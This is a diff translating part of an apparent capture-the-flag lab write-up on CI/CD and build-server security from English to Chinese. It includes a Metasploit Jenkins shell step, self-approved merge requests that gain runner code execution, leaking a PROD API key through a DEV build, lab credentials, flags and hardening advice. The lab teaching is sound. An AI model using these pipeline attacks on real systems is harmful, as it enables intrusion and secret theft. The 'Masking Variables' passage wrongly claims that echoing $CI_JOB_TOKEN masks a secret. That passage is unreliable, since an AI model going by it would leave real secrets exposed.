    0   Windows
 ```
 
-Configure your module with the correct values and execute for a shell:
+使用正确的值配置您的模块并执行以获得shell：
 
 ```shell title="Terminal"
 msf6 exploit(multi/http/jenkins_script_console) > set target 1
@@ -820,28 +820,28 @@ meterpreter > getuid
 Server username: jenkins
 ```
 
-You can also look to perform manual exploitation on the Jenkins server. This will involve accessing the script console and using a Groovy script to execute commands. Feel free to play around!
+您也可以尝试在Jenkins服务器上执行手动利用。 这将涉及访问脚本控制台并使用Groovy脚本执行命令。 请随意尝试！
 
-### Protecting the Build Server
+### 保护构建服务器
 
-The following steps can be followed to protect both your build server and build agents:
+可以遵循以下步骤来保护您的构建服务器和构建代理：
 
-- **Build Agent Configuration**: Configure build agents to only communicate with the build server, avoiding external exposure.
-- **Private Network**: Place build agents within a private network, preventing direct internet access.
-- **Firewalls**: Employ firewalls to restrict incoming connections to necessary Build server-related traffic.
-- **VPN**: Use a VPN to access the build server and its agents securely from remote locations.
-- **Token-Based Authentication**: Utilise build agent tokens for authentication, adding an extra layer of security.
-- **SSH Keys**: For SSH-based build agents, use secure SSH keys for authentication.
-- **Continuous Monitoring**: Regularly monitor build agent activities and logs for unusual behaviour.
-- **Regular Updates**: Update both the build server and agents with security patches.
-- **Security Audits**: Conduct periodic security audits to identify and address vulnerabilities.
-- **Remove Defaults and Harden Configuration**: Make sure to harden your build server and remove all default credentials and weak configurations.
+- **构建代理配置**：配置构建代理仅与构建服务器通信，避免外部暴露。
+- **私有网络**：将构建代理置于私有网络中，防止直接访问互联网。
+- **防火墙**：使用防火墙限制入站连接，仅允许必要的构建服务器相关流量。
+- **VPN**：使用VPN从远程位置安全访问构建服务器及其代理。
+- **基于令牌的身份验证**：利用构建代理令牌进行身份验证，增加额外的安全层。
+- **SSH密钥**：对于基于SSH的构建代理，使用安全的SSH密钥进行身份验证。
+- **持续监控**：定期监控构建代理活动和日志，检测异常行为。
+- **定期更新**：为构建服务器和代理更新安全补丁。
+- **安全审计**：定期进行安全审计，识别并解决漏洞。
+- **移除默认设置并强化配置**：确保强化构建服务器配置，移除所有默认凭据和弱配置。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> What can be used to ensure that remote access to the build server can be performed securely? </summary>
+<summary> 可以使用什么来确保远程访问构建服务器能够安全执行？ </summary>
 
 ```plaintext
 VPN
@@ -851,7 +851,7 @@ VPN
 
 <details>
 
-<summary> What can be used to add an additional layer of authentication security for build agents? </summary>
+<summary> 可以使用什么为构建代理添加额外的身份验证安全层？ </summary>
 
 ```plaintext
 Token-Based Authentication
@@ -861,7 +861,7 @@ Token-Based Authentication
 
 <details>
 
-<summary> Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2? </summary>
+<summary> 向Mother进行身份验证并按照流程获取Flag 2。 Flag 2是什么？ </summary>
 
 ```plaintext
 THM{1769f776-e03c-40b6-b2eb-b298297c15cc}
@@ -871,105 +871,105 @@ THM{1769f776-e03c-40b6-b2eb-b298297c15cc}
 
 :::
 
-## Task 8 Securing the Build Pipeline
+## 任务8 保护构建流水线
 
-With our build server secure, we will take a look at the pipeline itself next! Even if we do everything correctly, we still have to consider that one of our developers may be compromised. Whether the actual developer is compromised through a social engineering attack or simply their credentials being exposed, this compromise could be the downfall of our pipeline and build. Fortunately, there are protections that can be applied!
+在确保构建服务器安全后，接下来我们将关注流水线本身！ 即使我们做对了所有事情，仍然需要考虑我们的开发人员可能被入侵的情况。 无论是实际开发人员通过社会工程攻击被入侵，还是仅仅他们的凭据被泄露，这种入侵都可能导致我们的流水线和构建失败。 幸运的是，有可以应用的保护措施！
 
-### Access Gates
+### 访问门控
 
-Access gates, also known as gates or checkpoints, serve as "stages" within a software development pipeline. They ensure that code progresses through the pipeline only after meeting predefined quality and security criteria. Access gates are crucial in enhancing the development process's control, quality assurance, and security. It's beneficial for everyone.
+访问门控，也称为门或检查点，在软件开发流水线中充当"阶段"。 它们确保代码只有在满足预定义的质量和安全标准后才能通过流水线推进。 访问门控在增强开发过程的控制、质量保证和安全性方面至关重要。 这对每个人都有益。
 
-1. **Enhanced Control**: Access gates provide checkpoints in the pipeline, allowing controlled progression to different stages.
-2. **Quality Control**: Gates ensures that code meets predefined quality standards before advancing.
-3. **Security Checks**: Gates enables security assessments, such as vulnerability scans, before deployment.
+1. **增强控制**：访问门控在流水线中提供检查点，允许受控地推进到不同阶段。
+2. **质量控制**：门控确保代码在推进前满足预定义的质量标准。
+3. **安全检查**：门控支持在部署前进行安全评估，例如漏洞扫描。
 
-**Implementation Steps**:
+**实施步骤**：
 
-1. **Manual Approvals**: Require manual approval before moving to the next stage, ensuring thorough reviews.
-2. **Automated Tests**: Set up automated testing gates for code quality, unit tests, integration tests, etc.
-3. **Security Scans**: Integrate security scanning tools to detect vulnerabilities in the codebase.
-4. **Release Gates**: Use gates to verify proper documentation, versioning, and compliance.
-5. **Environment Validation**: Validate the target environment's readiness before deployment.
-6. **Rollback Plan**: Include a gate for a well-defined rollback plan in case of issues post-deployment.
-7. **Monitoring**: Implement monitoring gates to assess post-deployment performance.
-8. **Parallel Gates**: Run gates in parallel to expedite the pipeline without compromising quality.
-9. **Auditing**: Regularly review gate configurations and results to ensure effectiveness.
+1. **手动审批**：在进入下一阶段前需要手动审批，确保彻底审查。
+2. **自动化测试**：为代码质量、单元测试、集成测试等设置自动化测试门控。
+3. **安全扫描**：集成安全扫描工具以检测代码库中的漏洞。
+4. **发布门控**：使用门控验证适当的文档、版本控制和合规性。
+5. **环境验证**：在部署前验证目标环境的准备情况。
+6. **回滚计划**：包含一个门控，用于在部署后出现问题时执行明确定义的回滚计划。
+7. **监控**：实施监控门控以评估部署后性能。
+8. **并行门控**：并行运行门控以加快流水线速度，同时不牺牲质量。
+9. **审计**：定期审查门控配置和结果以确保有效性。
 
-### The Two-Person Concept
+### 双人原则
 
-Even if we have access gates, we need to ensure that no single user can pass these access gates. If you are the developer who initiated the build, you should be prevented from passing the next access gate. This should always be someone else. By enforcing this with a technical control, it can be assured that in the event that a developer is compromised, a build cannot be pushed through. This is referred to as the two-person rule.
+即使我们有访问门控，也需要确保没有单个用户能够通过这些访问门控。 如果您是发起构建的开发人员，您应该被阻止通过下一个访问门控。 这应该始终由其他人完成。 通过技术控制强制执行这一点，可以确保在开发人员被入侵的情况下，构建无法被推进。 这被称为双人规则。
 
-Some build servers may not allow you to ensure a control on the access gate to ensure that it is a different person. A good workaround in these cases is to simply increase the count of approvals needed from 1 to 2. This way, the developer provides one approval, but a secondary person has to provide the other.
+某些构建服务器可能不允许您对访问门控实施控制以确保是不同的人员。 在这些情况下，一个好的解决方法是简单地将所需的审批数量从1增加到2。 这样，开发人员提供一个审批，但第二个人必须提供另一个审批。
 
-### Exploiting Misconfigured Access Gates
+### 利用配置错误的访问门控
 
-Let's take a look at an example where access gates have been misconfigured. In this example, we will provide you with access as the Ana user. You will use this user for all exercises going forward. You can use the following details to authenticate to Gitlab as Ana:
+让我们看一个访问门控配置错误的示例。 在此示例中，我们将为您提供作为Ana用户的访问权限。 您将在所有后续练习中使用此用户。 您可以使用以下详细信息以Ana身份验证到Gitlab：
 
-|    Key   |          Value          |
-| :------: | :---------------------: |
-| Username |        anatacker        |
-| Password | Password1@ |
+|  键  |            值            |
+| :-: | :---------------------: |
+| 用户名 |        anatacker        |
+|  密码 | Password1@ |
 
-Ash has provided Ana with developer access to his Approval-Test repo, which can be found here: [http://gitlab.tryhackme.loc/ash/approval-test](http://gitlab.tryhackme.loc/ash/approval-test). To protect the main branch of the repo, Ash has configured the main branch to be a protected branch, where developers are only allowed to make merge requests and no direct code changes. Let's test this by updating the README file and trying to commit the change to the main branch. Navigate to the README file and click Edit:
+Ash已授予Ana对其Approval-Test仓库的开发人员访问权限，该仓库可在此处找到：[http://gitlab.tryhackme.loc/ash/approval-test](http://gitlab.tryhackme.loc/ash/approval-test)。 为了保护仓库的主分支，Ash已将主分支配置为受保护分支，开发人员仅允许创建合并请求，不允许直接更改代码。 让我们通过更新README文件并尝试将更改提交到主分支来测试这一点。 导航到README文件并单击编辑：
 
-![README file edit screen](img/image_20251130-143011.png)
+![README文件编辑屏幕](img/image_20251130-143011.png)
 
-As you can see, Gitlab is automatically requesting that we start a merge request with the changes we want to make. You will also see that we cannot unselect the option to commit directly. Make a small change to the file and click Commit changes:
+如您所见，Gitlab自动要求我们为我们想要进行的更改启动合并请求。 您还会看到我们无法取消选择直接提交的选项。 对文件进行小更改并单击提交更改：
 
-![commit changes button](img/image_20251131-143101.png)
+![提交更改按钮](img/image_20251131-143101.png)
 
-Immediately, you will see that we have to make a merge request for our change. Add a description and create the merge request. Ash's thought process behind this was that it would protect the main branch, as the company has a policy that states merge requests must be approved by a manager. Since we are now forced to make a merge request, the main branch is protected. However, Ash has made the following two errors in his security thought process:
+立即，您会看到我们必须为我们的更改创建合并请求。 添加描述并创建合并请求。 Ash的思考过程是这将保护主分支，因为公司政策规定合并请求必须由经理批准。 由于我们现在被迫创建合并请求，主分支受到保护。 然而，Ash在他的安全思考过程中犯了以下两个错误：
 
-- Policies that are not enforced through a technology will not be respected by attackers. Sure, the policy says that a manager must approve the merge request, but if you read the merge request, you will see that from a technical standpoint, Gitlab indicates that approval is optional.
-- Although the main branch is protected by not allowing any direct pushes, since developers can still make merge requests, they can simply push their own merge request to commit code to the main branch. The two-person principle was not implemented to ensure that another person has to accept the merge request.
+- 未通过技术强制执行的策略不会被攻击者尊重。 当然，政策说经理必须批准合并请求，但如果您阅读合并请求，您会看到从技术角度来看，Gitlab表示批准是可选的。
+- 尽管主分支通过不允许任何直接推送而受到保护，但由于开发人员仍然可以创建合并请求，他们可以简单地推送自己的合并请求以将代码提交到主分支。 未实施双人原则以确保必须由另一个人接受合并请求。
 
-Leveraging these mistakes, as an attacker, you can simply approve your own merge request (though it isn't even needed) and you can then merge it to the main branch, as shown below!
+利用这些错误，作为攻击者，您可以简单地批准自己的合并请求（尽管甚至不需要），然后您可以将其合并到主分支，如下所示！
 
-![merged changes to main branch](img/image_20251131-143130.png)
+![合并更改到主分支](img/image_20251131-143130.png)
 
-Reviewing the code in the main branch, you have made a change to the main branch! Now comes the fun part. The GitLab runner was configured to only run on the main branch. Since we can now push code to the main branch, we can compromise the runner. Now that you know how to get your code to the main branch, make some changes to the .gitlab-ci.yml file to get code execution on the runner. You can use any of the techniques you have been taught up to this point!
+审查主分支中的代码，您已对主分支进行了更改！ 现在到了有趣的部分。 GitLab runner 被配置为仅在主分支上运行。 既然我们现在可以向主分支推送代码，我们就可以入侵 runner。 现在您知道了如何将代码推送到主分支，请对 .gitlab-ci.yml 文件进行一些更改，以在 runner 上获取代码执行权限。 您可以使用到目前为止学到的任何技术！
 
-### Protecting the Pipeline
+### 保护流水线
 
-Protecting your GitLab CI/CD pipeline is essential to ensure the security of your code and infrastructure. Here are steps you can take to protect your pipeline with access gates and prevent unauthorised code execution like the example above:
+保护您的 GitLab CI/CD 流水线对于确保代码和基础设施的安全至关重要。 以下是您可以采取的步骤，通过访问门控来保护您的流水线，并防止未经授权的代码执行，如上述示例所示：
 
-#### Limit Branch Access
+#### 限制分支访问
 
-Restrict who can push to the main branch. Only trusted developers should have the ability to push code to this branch. You can do this by configuring branch protection rules in your GitLab repository settings. Navigate to Settings > Repository > Default branch. Configure the rules to require reviews before allowing changes.
+限制谁可以向主分支推送代码。 只有受信任的开发人员才应具备向此分支推送代码的能力。 您可以通过在 GitLab 仓库设置中配置分支保护规则来实现这一点。 导航到 设置 > 仓库 > 默认分支。 配置规则以要求在允许更改之前进行审查。
 
-![settings page](img/image_20251132-143206.png)
+![设置页面](img/image_20251132-143206.png)
 
-![settings menu](img/image_20251132-143217.png)
+![设置菜单](img/image_20251132-143217.png)
 
-#### Review Merge Requests
+#### 审查合并请求
 
-Enforce merge requests (or pull requests) to make main branch changes. Merge requests provide a way to review and approve code changes before merging. You can configure a merge request approvals to ensure multiple team members review and approve changes.
+强制执行合并请求（或拉取请求）以进行主分支更改。 合并请求提供了一种在合并之前审查和批准代码更改的方式。 您可以配置合并请求审批，以确保多个团队成员审查并批准更改。
 
-#### Use CI/CD Variables
+#### 使用 CI/CD 变量
 
-Avoid storing sensitive information directly in your .gitlab-ci.yml file. Instead, use GitLab CI/CD variables to store secrets like API keys, passwords, and tokens. These variables can be protected and restricted to specific branches and tags.
+避免在 .gitlab-ci.yml 文件中直接存储敏感信息。 相反，使用 GitLab CI/CD 变量来存储机密信息，如 API 密钥、密码和令牌。 这些变量可以受到保护，并限制在特定的分支和标签上使用。
 
-#### Limit Runner Access
+#### 限制 Runner 访问
 
-Only allow trusted runners to execute CI/CD jobs. By specifying tags, you can register runners with specific tags and then restrict which runners can be used for jobs in your .gitlab-ci.yml file. Only runners with the appropriate tags can run jobs on the main branch.
+只允许受信任的 runner 执行 CI/CD 作业。 通过指定标签，您可以为特定的标签注册 runner，然后在 .gitlab-ci.yml 文件中限制哪些 runner 可以用于作业。 只有具有适当标签的 runner 才能在主分支上运行作业。
 
-#### Access Control and Permissions
+#### 访问控制和权限
 
-Review and configure project-level and group-level access controls and permissions. It's always good to review and ensure you have the least privilege by checking the project's settings and modifying the CI/CD configuration if necessary.
+审查并配置项目级和组级的访问控制和权限。 通过检查项目的设置并在必要时修改 CI/CD 配置，审查并确保您拥有最小权限始终是好的做法。
 
-#### Regular Audits
+#### 定期审计
 
-Conduct regular security audits of your GitLab configuration and CI/CD pipeline. Review who has access and permissions and ensure that best practices are followed.
+定期对您的 GitLab 配置和 CI/CD 流水线进行安全审计。 审查谁拥有访问权限和权限，并确保遵循最佳实践。
 
-#### Monitor and Alert
+#### 监控和告警
 
-Set up monitoring and alerting for your pipeline. Implement security monitoring solutions to detect unusual or unauthorised activities in your GitLab environment and CI/CD pipeline.
+为您的流水线设置监控和告警。 实施安全监控解决方案，以检测 GitLab 环境和 CI/CD 流水线中的异常或未经授权的活动。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> What can we add so that merges are raised for review instead of pushing the changes to code directly? </summary>
+<summary> 我们可以添加什么，以便为合并请求进行审查，而不是直接将更改推送到代码？ </summary>
 
 ```plaintext
 merge requests
@@ -979,7 +979,7 @@ merge requests
 
 <details>
 
-<summary> What should we do so that only trusted runners execute CI/CD jobs? </summary>
+<summary> 我们应该做什么，以便只有受信任的 runner 执行 CI/CD 作业？ </summary>
 
 ```plaintext
 limit runner access
@@ -989,7 +989,7 @@ limit runner access
 
 <details>
 
-<summary> Authenticate to Mother and follow the process to claim Flag 3. What is Flag 3? </summary>
+<summary> 向 Mother 认证并按照流程获取 Flag 3。 Flag 3 是什么？ </summary>
 
 ```plaintext
 THM{2411b26f-b213-462e-b94c-39d974e503e6}
@@ -999,55 +999,55 @@ THM{2411b26f-b213-462e-b94c-39d974e503e6}
 
 :::
 
-## Task 9 Securing the Build Environment
+## 任务 9 保护构建环境
 
-Our pipeline is secure; we are almost there! Two more steps to go! Next on the list is making sure that our environments are secure. The last point where a threat actor may attempt to compromise our build is at the point where we deploy the build to its environment.
+我们的流水线是安全的；我们几乎完成了！ 还剩下两个步骤！ 接下来的任务是确保我们的环境是安全的。 威胁行为者可能尝试入侵我们构建的最后一个点是在我们将构建部署到其环境时。
 
-### Environment Segregation
+### 环境隔离
 
-A key security principle in our pipeline is to ensure that our different environments are segregated. Environments are not created equal, especially in these modern times where Agile principles are used. Developers are often provided with quite a lot of access and abilities in environments other than production (PROD) and  pre-production (PREPROD). If you need a refresher on the different types of environments, take a look at this room. With these additional permissions, we need to make sure that there is adequate segregation between the various environments.
+我们流水线中的一个关键安全原则是确保我们的不同环境是隔离的。 环境并不平等，尤其是在使用敏捷原则的现代时代。 开发人员通常在生产（PROD）和预生产（PREPROD）以外的环境中被授予相当多的访问权限和能力。 如果您需要复习不同类型的环境，请查看这个房间。 有了这些额外的权限，我们需要确保各种环境之间有足够的隔离。
 
-At first glance, you may think that this is a simple endeavour. All we need to do is to ensure that developers do not have access to these sensitive environments. However, with the introduction of pipelines, this becomes a tad bit more complex. Even if we restrict direct access to these environments, there may be side channels in the pipeline that can be exploited. In this task, we will take a look at one common misconfiguration when the build agents themselves are not segregated.
+乍一看，您可能认为这是一项简单的任务。 我们需要做的就是确保开发人员无法访问这些敏感环境。 然而，随着流水线的引入，这变得稍微复杂一些。 即使我们限制对这些环境的直接访问，流水线中也可能存在可以被利用的侧信道。 在这个任务中，我们将看看一个常见的错误配置，即构建代理本身没有被隔离。
 
-### One Build Agent to Rule Them All
+### 一个构建代理统治所有
 
-In our next example, Ash has learnt from his mistakes and made sure only to provide Ana with access to the development (DEV) branch. Main is now fully restricted. We still have access to the DEV branch since Ash wants his developers to adopt an Agile development process. Luckily for us, the DEV branch does have a Gitlab runner attached to it. Navigate to the new repo at [http://gitlab.tryhackme.loc/ash/environments/](http://gitlab.tryhackme.loc/ash/environments/) to get started. Navigate to the Operate->Environment section to view the two environments:
+在我们的下一个示例中，Ash 从他的错误中吸取了教训，并确保只授予 Ana 对开发（DEV）分支的访问权限。 主分支现在完全受限。 我们仍然可以访问 DEV 分支，因为 Ash 希望他的开发人员采用敏捷开发流程。 幸运的是，DEV 分支确实附加了一个 GitLab runner。 导航到新的仓库 [http://gitlab.tryhackme.loc/ash/environments/](http://gitlab.tryhackme.loc/ash/environments/) 开始。 导航到 操作->环境 部分以查看两个环境：
 
-![environment selection menu](img/image_20251146-144614.png)
+![环境选择菜单](img/image_20251146-144614.png)
 
-Let's take a closer look at the last build that was performed for production. Click on the build and select the Pipeline tab to see the build that was executed for production:
+让我们仔细看看为生产执行的最后一次构建。 点击构建并选择 流水线 选项卡以查看为生产执行的构建：
 
-![pipeline execution tab](img/image_20251146-144641.png)
+![流水线执行选项卡](img/image_20251146-144641.png)
 
-Investigate the pipeline and look at one of the jobs executed for the main pipeline. By clicking on a job that has the main tag, pay attention to the runner specified in the top right corner:
+调查流水线并查看为主流水线执行的其中一个作业。 通过点击一个带有 main 标签的作业，注意右上角指定的 runner：
 
-![runner information](img/image_20251146-144657.png)
+![runner 信息](img/image_20251146-144657.png)
 
-As we can see, runner number 6 was used for the build. Following the steps from the previous task, in the DEV branch, make a small change to the README file and observe which runner is being used for the job.
+如我们所见，构建使用了编号为 6 的 runner。 按照上一个任务的步骤，在 DEV 分支中，对 README 文件进行一个小更改，并观察哪个 runner 被用于该作业。
 
-Interesting! It seems that Ash is trying to save some budget by having a single runner for the project. Responsible for DEV and PROD builds. Therefore, if we compromise the runner through our DEV access, we can intercept a production build! Leverage one of the previous techniques to compromise the build agent and read some sensitive information from the runner! Once you have compromised the runner, you can access both DEV and PROD!
+有趣！ 看来 Ash 试图通过为项目使用单个 runner 来节省一些预算。 负责 DEV 和 PROD 构建。 因此，如果我们通过 DEV 访问入侵 runner，我们就可以拦截生产构建！ 利用之前的一种技术入侵构建代理，并从 runner 读取一些敏感信息！ 一旦您入侵了 runner，您就可以访问 DEV 和 PROD！
 
-### Protecting the Build Environment
+### 保护构建环境
 
-Protecting your build environment is crucial to prevent compromising your production pipeline through a single runner shared between DEV and PROD. Here are some steps you can take to enhance security:
+保护您的构建环境对于防止通过 DEV 和 PROD 共享的单个 runner 入侵您的生产流水线至关重要。 以下是一些您可以采取的步骤来增强安全性：
 
-#### Isolate Environments
+#### 隔离环境
 
-Separate your DEV and PROD pipelines as much as possible. Use separate runners or runner tags for DEV and PROD builds. Ensuring that any compromise in the DEV environment does not directly impact PROD. This way, you can't compromise PROD in the way shown in this task.
+尽可能分离您的 DEV 和 PROD 流水线。 为 DEV 和 PROD 构建使用单独的 runner 或 runner 标签。 确保 DEV 环境中的任何入侵不会直接影响 PROD。 这样，您就无法以本任务中所示的方式入侵 PROD。
 
-#### Restricted Access for CI/CD Jobs
+#### 限制 CI/CD 作业的访问
 
-Limit access to the runner host. Only authorised personnel should have access to the machine(s) running the GitLab Runner. Implement strong access controls and monitor for unauthorised access. GitLab provides a "Protected CI/CD environments" feature that allows you to define access controls for environments, restricting who can deploy to them. Permission features limit and assigns who can modify CI/CD configuration, including the .gitlab-ci.yml file.
+限制对运行器主机的访问。 只有授权人员才能访问运行 GitLab Runner 的机器。 实施强访问控制并监控未经授权的访问。 GitLab 提供"受保护的 CI/CD 环境"功能，允许您为环境定义访问控制，限制谁可以部署到这些环境。 权限功能限制并分配谁可以修改 CI/CD 配置，包括 .gitlab-ci.yml 文件。
 
-#### Monitoring and Alerting
+#### 监控和告警
 
-Implement monitoring and alerting for your CI/CD pipeline and runner. Set up alerts for suspicious activity or failed builds, which could indicate a compromise. Review and audit access permissions periodically, especially for environments and CI/CD configurations. Revoke access for users or roles that no longer require it.
+为您的 CI/CD 流水线和运行器实施监控和告警。 为可疑活动或构建失败设置告警，这可能表明系统已遭到入侵。 定期审查和审计访问权限，特别是环境和 CI/CD 配置的权限。 撤销不再需要访问权限的用户或角色的访问权限。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> What should you do so that a compromised environment doesn't affect other environments? </summary>
+<summary> 您应该怎么做才能确保受入侵的环境不会影响其他环境？ </summary>
 
 ```plaintext
 isolate environments
@@ -1057,7 +1057,7 @@ isolate environments
 
 <details>
 
-<summary> Authenticate to Mother and follow the process to claim Flag 4 from the DEV environment. What is Flag 4? </summary>
+<summary> 向 Mother 认证并按照流程从 DEV 环境领取 Flag 4。 Flag 4 是什么？ </summary>
 
 ```plaintext
 THM{28f36e4a-7c35-4e4d-bede-be698ddf0883}
@@ -1067,7 +1067,7 @@ THM{28f36e4a-7c35-4e4d-bede-be698ddf0883}
 
 <details>
 
-<summary> Authenticate to Mother and follow the process to claim Flag 5 from the PROD environment. What is Flag 5? </summary>
+<summary> 向 Mother 认证并按照流程从 PROD 环境领取 Flag 5。 Flag 5 是什么？ </summary>
 
 ```plaintext
 THM{e9f99dbe-6bae-4849-adf7-18a449c93fe6}
@@ -1077,33 +1077,33 @@ THM{e9f99dbe-6bae-4849-adf7-18a449c93fe6}
 
 :::
 
-## Task 10 Securing the Build Secrets
+## 任务 10 保护构建机密
 
-We can see the finish line in front of us! Our pipeline and build are almost secure! One final step remains: making sure that our build secrets are adequately protected!
+我们能看到终点线就在眼前！ 我们的流水线和构建几乎已经安全了！ 只剩下最后一步：确保我们的构建机密得到充分保护！
 
-### One Secret to Rule Them All
+### 一机密统领全局
 
-Larry has now finally learnt his lesson and made sure to implement segregated runners for the different environments. But there is one more issue. While these pipelines may be segregated, we need to make sure that the secrets (or variables as they are known in Gitlab) are also segregated. If the scope for secrets is not narrowly defined, we can request the use of PROD secrets in our DEV build, allowing us to compromise the production environment one last time! Navigate to the last repo we used for this exploit: [http://gitlab.tryhackme.loc/ash/environments](http://gitlab.tryhackme.loc/ash/environments).
+Larry 现在终于吸取了教训，确保为不同环境实施了隔离的运行器。 但还有一个问题。 虽然这些流水线可能是隔离的，但我们需要确保机密（在 GitLab 中称为变量）也是隔离的。 如果机密的作用域没有明确定义，我们可以在 DEV 构建中请求使用 PROD 机密，从而最后一次入侵生产环境！ 导航到我们用于此漏洞利用的最后一个仓库：[http://gitlab.tryhackme.loc/ash/environments](http://gitlab.tryhackme.loc/ash/environments)。
 
-Let's take a look at the environments and the latest builds for them, as we have done in the previous task. Taking a look at one of the production deployments, we can see that the build is making use of an API_KEY variable:
+让我们像上一个任务中那样，查看环境和它们的最新构建。 查看其中一个生产部署，我们可以看到构建正在使用 API_KEY 变量：
 
-![API_KEY variable](img/image_20251149-144903.png)
+![API_KEY 变量](img/image_20251149-144903.png)
 
-As Ana, we don't have the permissions required to list the different variables, but taking a look at the DEV branch's CI file, we can see that our DEV variable is different:
+作为 Ana，我们没有列出不同变量所需的权限，但查看 DEV 分支的 CI 文件，我们可以看到我们的 DEV 变量是不同的：
 
-![DEV variable](img/image_20251149-144920.png)
+![DEV 变量](img/image_20251149-144920.png)
 
-In our case, the value is API_KEY_DEV. Let's make a change to this variable and also echo out the value to see if we can access the PROD variable. Make the change to the CI file in the DEV branch and see what happens!
+在我们的例子中，值是 API_KEY_DEV。 让我们修改这个变量，并回显其值，看看我们是否能访问 PROD 变量。 在 DEV 分支的 CI 文件中进行更改，看看会发生什么！
 
-### Protecting the Build Secrets
+### 保护构建机密
 
-Protecting build secrets, even when using GitLab CI/CD variables, is crucial for maintaining the security of your pipelines. GitLab CI/CD provides a feature called "masked variables" to help prevent secrets from being exposed in logs. Here's how you can use this feature:
+保护构建机密，即使在使用 GitLab CI/CD 变量时，对于维护流水线的安全性也至关重要。 GitLab CI/CD 提供了一个名为"掩码变量"的功能，以帮助防止机密在日志中暴露。 以下是您如何使用此功能：
 
-#### Masking Variables
+#### 掩码变量
 
-You can mask variables in your .gitlab-ci.yml file by using the CI_JOB_TOKEN predefined variable. This token is automatically set by GitLab and can be used to mask any variable value you want to keep hidden.
+您可以通过使用 CI_JOB_TOKEN 预定义变量在 .gitlab-ci.yml 文件中掩码变量。 此令牌由 GitLab 自动设置，可用于掩码任何您希望隐藏的变量值。
 
-For example, if you have a variable named MY_SECRET_KEY, you can use it like this:
+例如，如果您有一个名为 MY_SECRET_KEY 的变量，您可以像这样使用它：
 
 ```yml
 my_job:
@@ -1112,26 +1112,26 @@ my_job:
     - echo "masked: $CI_JOB_TOKEN" # This will mask the secret
 ```
 
-#### Use Secure Variables
+#### 使用安全变量
 
-If you want to store secrets securely in GitLab, you can use GitLab CI/CD variables with the "Masked" option enabled. These variables are stored securely and are never exposed in job logs, even if you use them directly in your scripts. To create a secure variable:
+如果您想在 GitLab 中安全地存储机密，您可以使用启用了"掩码"选项的 GitLab CI/CD 变量。 这些变量被安全存储，即使在脚本中直接使用，也永远不会在作业日志中暴露。 要创建安全变量：
 
-- Go to the GitLab project.
-- Navigate to Settings > CI/CD > Variables.
-- Add a new variable, select the "Masked" checkbox, and provide the value.
-- Once you've added a secure variable, you can use it in your .gitlab-ci.yml file without worrying about it being exposed in logs.
+- 转到 GitLab 项目。
+- 导航到 设置 > CI/CD > 变量。
+- 添加一个新变量，选择"掩码"复选框，并提供值。
+- 添加安全变量后，您可以在 .gitlab-ci.yml 文件中使用它，而不用担心它在日志中暴露。
 
-Note: Ensure that your job scripts do not inadvertently echo or print sensitive information, even when using masked variables. Double-check your scripts to avoid unintentional exposure of secrets.
+注意：确保您的作业脚本不会无意中回显或打印敏感信息，即使在使用掩码变量时也是如此。 仔细检查您的脚本，避免无意中暴露机密。
 
-#### Access Control
+#### 访问控制
 
-Limit access to CI/CD variables and logs. Only authorized can view job logs and variables in GitLab. You can configure project-level and group-level access controls to achieve this.
+限制对 CI/CD 变量和日志的访问。 只有授权人员才能在 GitLab 中查看作业日志和变量。 您可以配置项目级和组级访问控制来实现这一点。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> Is using environment variables enough to protect the build secrets? (yay or nay) </summary>
+<summary> 使用环境变量是否足以保护构建机密？ (是或否) </summary>
 
 ```plaintext
 nay
@@ -1141,7 +1141,7 @@ nay
 
 <details>
 
-<summary> What is the value of the PROD API_KEY? </summary>
+<summary> PROD API_KEY 的值是什么？ </summary>
 
 ```plaintext
 THM{Secrets.are.meant.to.be.kept.Secret}
@@ -1151,23 +1151,23 @@ THM{Secrets.are.meant.to.be.kept.Secret}
 
 :::
 
-## Task 11 Conclusion
+## 任务11 结论
 
-Based on the attacks and misconfigurations we saw in the previous tasks, we can understand that:
+基于我们在先前任务中看到的攻击和错误配置，我们可以理解：
 
-1. Pipeline Security is a Priority: Ensuring the security of your CI/CD pipeline is crucial for safeguarding code and data integrity.
-2. Access Controls are Fundamental: Restricting access to critical branches, environments, and CI/CD variables is the first line of defence against unauthorised changes and data exposure.
-3. Runner Security is Essential: Properly securing the machines running your GitLab Runner, along with strong authentication, is a must to prevent breaches.
-4. Secrets Management Matters: Safeguarding sensitive data, such as API keys and passwords, through GitLab CI/CD variables with masking and secure variables is vital. Using environment variables is not enough.
-5. Isolate Environments: Separating development (DEV) and production (PROD) environments minimises the risk of compromising the latter through the former.
-6. Continuous Vigilance: Regularly reviewing access permissions, scripts, and security configurations, combined with monitoring and alerting, ensures ongoing security.
-7. Education is Key: Educating your team about security best practices is essential to maintaining a robust security posture.
+1. 流水线安全是优先事项：确保 CI/CD 流水线的安全对于保护代码和数据完整性至关重要。
+2. 访问控制是基础：限制对关键分支、环境和 CI/CD 变量的访问是防止未经授权的更改和数据暴露的第一道防线。
+3. 运行器安全至关重要：正确保护运行 GitLab Runner 的机器，以及强身份验证，是防止入侵的必要措施。
+4. 机密管理很重要：通过 GitLab CI/CD 变量（使用掩码和安全变量）保护敏感数据（如 API 密钥和密码）至关重要。 使用环境变量是不够的。
+5. 隔离环境：分离开发（DEV）和生产（PROD）环境可以最小化通过前者入侵后者的风险。
+6. 持续警惕：定期审查访问权限、脚本和安全配置，结合监控和告警，确保持续的安全性。
+7. 教育是关键：教育您的团队关于安全最佳实践对于维护强大的安全态势至关重要。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> I understand CI/CD and Build Security! </summary>
+<summary> 我理解 CI/CD 和构建安全！ </summary>
 
 ```plaintext
 No answer needed
